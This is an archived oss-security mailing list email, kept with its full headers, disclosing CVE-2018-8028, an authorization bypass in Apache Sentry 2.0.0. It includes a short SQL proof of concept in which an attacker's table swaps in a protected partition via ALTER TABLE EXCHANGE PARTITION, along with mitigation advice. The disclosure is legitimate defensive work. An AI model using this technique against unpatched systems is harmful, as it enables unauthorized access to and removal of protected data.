X-VM-v5-Data: ([nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	["1793" "Thursday" "23" "August" "2018" "11:38:32" "-0500" "=?UTF-8?B?U2VyZ2lvIFBlw7Fh?=" "spena82@gmail.com" "<CAFbRtroTd0NqpWrCUunEBNgL6WGiTyz+eyBvDquy9oxa3zki=Q@mail.gmail.com>" "54" "[oss-security] [SECURITY] CVE-2018-8028: Bypass ALTER TABLE EXCHANGE PARTITIONS authorization for Hive" "^Cc:" nil nil "8" "2018082316:38:32" "[oss-security] [SECURITY] CVE-2018-8028: Bypass ALTER TABLE EXCHANGE PARTITIONS authorization for Hive" (number mark "        spena82@gmai Aug 23   54/1793  " thread-indent "\"[oss-security] [SECURITY] CVE-2018-8028: Bypass ALTER TABLE EXCHANGE PARTITIONS authorization for Hive\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
	nil)
X-Mozilla-Status: 0001
X-Mozilla-Status2: 00000000
Received: (qmail 3825 invoked by uid 550); 23 Aug 2018 21:51:51 -0000
Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
Precedence: bulk
List-Post: <mailto:oss-security@lists.openwall.com>
List-Help: <mailto:oss-security-help@lists.openwall.com>
List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
List-ID: <oss-security.lists.openwall.com>
Received: (qmail 30316 invoked from network); 23 Aug 2018 16:38:56 -0000
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=gmail.com; s=20161025;
        h=mime-version:from:date:message-id:subject:to:cc;
        bh=rnBcaWepTyDnqyotwlHHNSxobkB0bX78h3m5OQ60GdU=;
        b=tu13+RoOoBu0uetmEpr7KXzUzqheJoWwQQDWxXVBQuM+paku7pusWpXHIl6VmKzGgA
         G4uYFAw7oQsYDkHwoNv08Cbp/f4sWWaQL16O4IX0FM5sAxxMOY5WpBrkiiz6ftUraHKJ
         nNkyfFOd+eJIc6Q6Cos1UIiaxyvwljoyqSrjRj3A1Uhz+CGeZce1hSRvBIotET4J+ngp
         tZ4PtRMhsRlwlj7nMLBQCwgTQ1s/1it7u0FZPQzU70VIiP80OnH7iG4k1IIYV3CK1lne
         CrxZ7ctxlKWsevbXoOgnTC3xFp+iIoKF/2MO2Ulej9xSL1Y3BH/T7F5arbF+G1gZAxZZ
         +rVg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20161025;
        h=x-gm-message-state:mime-version:from:date:message-id:subject:to:cc;
        bh=rnBcaWepTyDnqyotwlHHNSxobkB0bX78h3m5OQ60GdU=;
        b=LNfAsD03c1uDoqN+E0MWkTNdK5qr406EyskuEeUu85++4BjItXslWgg2UQ+TyD6/2q
         05yinnpONtC4yhyW1R5+PYvvq7UBbFqjU6Uglcnwe/3mNrUg00wVOT95PicI8NhoyHN7
         KLFhZ6MYFI+npMdsYZM8g682bHM4vpxOE5q1AyPKTuVttDaqDzxhf13Nn+kuBf/o4+hg
         9VnFXYTObx1DJX0E25/cLt8hV8q+2x7ehz4fdcN9+JOfTDsTmVypLc9Sj60EYDDY3kXR
         buBmXMi/Zq+vnRMzHLhxX+3VFAq6FGZ5Kqx7edX3Zl+Hvgr+e0WR4MVUQ4sldjRP07Um
         ennw==
X-Gm-Message-State: APzg51Cq1R5oXo8uZJd++Y+lXUijoU6//JhoHbUsK1k3/TwKcJm55Cwb
	gWrmbXuikSUU/0B69CRL2oKndIr736o051O+tiE=
X-Google-Smtp-Source: ANB0Vdb9k+TDhuzG1U+HjyH3JH6AGtMFMJYumux1KzgqIN4hp4NB48MpAZjeB3b5rd+1rIrz1FuGKOcE+sXm4LSDuuE=
X-Received: by 2002:aca:7513:: with SMTP id q19-v6mr8612643oic.13.1535042324066;
 Thu, 23 Aug 2018 09:38:44 -0700 (PDT)
MIME-Version: 1.0
Message-ID: <CAFbRtroTd0NqpWrCUunEBNgL6WGiTyz+eyBvDquy9oxa3zki=Q@mail.gmail.com>
Content-Type: multipart/alternative; boundary="00000000000070f55505741ce443"
Cc: dev@sentry.apache.org
Date: Thu, 23 Aug 2018 11:38:32 -0500
From: =?UTF-8?B?U2VyZ2lvIFBlw7Fh?= <spena82@gmail.com>
Reply-To: oss-security@lists.openwall.com
Subject: [oss-security] [SECURITY] CVE-2018-8028: Bypass ALTER TABLE EXCHANGE PARTITIONS
 authorization for Hive
To: security@sentry.apache.org, biglauer@cloudera.com, 
	oss-security@lists.openwall.com

--00000000000070f55505741ce443
Content-Type: text/plain; charset="UTF-8"

[SECURITY] CVE-2018-8028: Bypass ALTER TABLE EXCHANGE PARTITIONS
authorization for Hive

Severity:
Major

Vendor:
The Apache Software Foundation

Versions Affected:
This vulnerability affects only the version of Apache Sentry 2.0.0 due to
the introduction of
Hive 2.x.

Description:
An authenticated user can execute ALTER TABLE EXCHANGE PARTITIONS without
being authorized by Sentry.
This can allow an attacker unauthorized access to the partitioned data of a
Sentry protected table and can allow
an attacker to remove data from a Sentry protected table.

Mitigation:
Apache Sentry users using 2.0.0 should upgrade to 2.0.1 or later.

Example:
The admin has created the following table in a database that the attacker
doesn't have access to:
> CREATE TABLE target_database1.aliens (name string) PARTITIONED BY
(home_planet string, diet string);
> ALTER TABLE target_database1.aliens ADD PARTITION (home_planet='earth',
diet='milk shakes');
> ALTER TABLE target_database1.aliens ADD PARTITION
(home_planet='trapis-4', diet='sentient lifeforms with cheese');

The attacker has a database attacker_database, created as follows:
> CREATE TABLE attacker_database.data_stealer (name string) PARTITIONED BY
(home_planet string, diet string);
> ALTER TABLE attacker_database.data_stealer EXCHANGE PARTITION
(home_planet='earth', diet='milk shakes')
   WITH TABLE target_database1.aliens;

The attacker now has access to all of the data in the target partitions
with the privileges available to them on attacker_database.

Credit:
This issue was discovered by Benjamin Iglauer of Cloudera.

References:
https://cwiki.apache.org/confluence/display/SENTRY/Vulnerabilities+found+in+Apache+Sentry

--00000000000070f55505741ce443--
